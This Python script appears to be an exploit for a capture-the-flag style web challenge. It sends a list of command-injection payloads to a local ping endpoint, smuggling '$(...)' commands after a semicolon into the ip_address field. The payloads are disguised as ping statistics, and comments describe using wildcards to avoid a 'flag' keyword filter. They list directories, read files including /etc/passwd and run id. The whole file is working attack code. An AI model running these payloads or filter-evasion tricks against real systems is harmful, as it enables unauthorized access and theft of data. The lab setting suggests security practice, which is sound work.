import requests
import re

url = "http://127.0.0.1:33052/ping"

# Now use $(command) successfully to find and read files
# Avoid "flag" keyword, use wildcards and patterns
payloads = [
    # Try wildcards to find txt files
    'invalid;echo "$(ls /*.txt 2>/dev/null) packets transmitted, 1 received, 0% packet loss"',
    
    # Try to read specific paths with wildcards (avoiding "flag" word)
    'invalid;echo "$(cat /????.txt 2>/dev/null) packets transmitted, 1 received, 0% packet loss"',
    
    # Read /root directory
    'invalid;echo "$(ls -la /root 2>/dev/null) packets transmitted, 1 received, 0% packet loss"',
    
    # Check for files starting with f
    'invalid;echo "$(ls /f* 2>/dev/null) packets transmitted, 1 received, 0% packet loss"',
    
    # List all files in root
    'invalid;echo "$(ls / 2>/dev/null) packets transmitted, 1 received, 0% packet loss"',
    
    # Check /home
    'invalid;echo "$(ls /home 2>/dev/null) packets transmitted, 1 received, 0% packet loss"',
    
    # Look at /tmp
    'invalid;echo "$(ls /tmp 2>/dev/null) packets transmitted, 1 received, 0% packet loss"',
    
    # Try /var
    'invalid;echo "$(ls /var 2>/dev/null) packets transmitted, 1 received, 0% packet loss"',
    
    # Check /opt
    'invalid;echo "$(ls /opt 2>/dev/null) packets transmitted, 1 received, 0% packet loss"',
    
    # Look for any file with "f" in name
    'invalid;echo "$(find / -maxdepth 2 -type f -name "f*" 2>/dev/null) packets transmitted, 1 received, 0% packet loss"',
    
    # Find all .txt files
    'invalid;echo "$(find / -maxdepth 3 -name "*.txt" 2>/dev/null) packets transmitted, 1 received, 0% packet loss"',
    
    # Check current directory
    'invalid;echo "$(ls -la . 2>/dev/null) packets transmitted, 1 received, 0% packet loss"',
    
    # Try reading with different patterns
    'invalid;echo "$(cat /[fF]*.txt 2>/dev/null) packets transmitted, 1 received, 0% packet loss"',
    
    # Try brace expansion if bash
    'invalid;echo "$(cat /{,root/,home/,tmp/}*.txt 2>/dev/null) packets transmitted, 1 received, 0% packet loss"',
    
    # Check /srv
    'invalid;echo "$(ls /srv 2>/dev/null) packets transmitted, 1 received, 0% packet loss"',
    
    # Read /run
    'invalid;echo "$(ls /run 2>/dev/null) packets transmitted, 1 received, 0% packet loss"',
    
    # Try to see what's in /usr/local
    'invalid;echo "$(ls /usr/local 2>/dev/null) packets transmitted, 1 received, 0% packet loss"',
    
    # Check for FL*.txt pattern (uppercase)
    'invalid;echo "$(cat /[A-Z]*.txt 2>/dev/null) packets transmitted, 1 received, 0% packet loss"',
    
    # Test if we can read a known file first
    'invalid;echo "$(head -c 50 /etc/passwd) packets transmitted, 1 received, 0% packet loss"',
    
    # Check what user we are
    'invalid;echo "$(id) packets transmitted, 1 received, 0% packet loss"',
]

print("="*80)
print("File Discovery and Reading")
print("="*80)

results = []

for i, payload in enumerate(payloads, 1):
    print(f"\n[TEST {i}] Payload: {payload[:65]}...")
    print("-"*60)
    
    try:
        resp = requests.post(url, data={"ip_address": payload}, timeout=15)
        
        print(f"Status: {resp.status_code}")
        
        if "Invalid input" not in resp.text:
            match = re.search(r'Packets Transmitted: ([^,]+), Packets Received: ([^,]+), Packet Loss: ([^%]+)%', resp.text)
            if match:
                trans, recv, loss = match.groups()
                print(f"Transmitted: '{trans[:100]}{'...' if len(trans) > 100 else ''}'")
                print(f"Received: '{recv}'")
                # If transmitted contains interesting content, show more
                if trans and trans not in ['1', '2'] and not trans.isdigit():
                    print(f"[!] INTERESTING! Full transmitted value: {trans}")
            else:
                print(f"Response preview: {resp.text[:300]}...")
        else:
            print("BLOCKED: Invalid input")
                
        results.append({
            'test': i,
            'payload': payload,
            'response': resp.text
        })
        
    except Exception as e:
        print(f"ERROR: {e}")

# Summary of findings
print("\n" + "="*80)
print("FILES/DIRECTORIES FOUND")
print("="*80)

for r in results:
    resp = r['response']
    if "Invalid input" not in resp:
        match = re.search(r'Packets Transmitted: ([^,]+),', resp)
        if match:
            trans = match.group(1).strip()
            # Show non-trivial results
            if trans and trans not in ['1', '2', '']:
                print(f"\n[TEST {r['test']}] Found: {trans}")

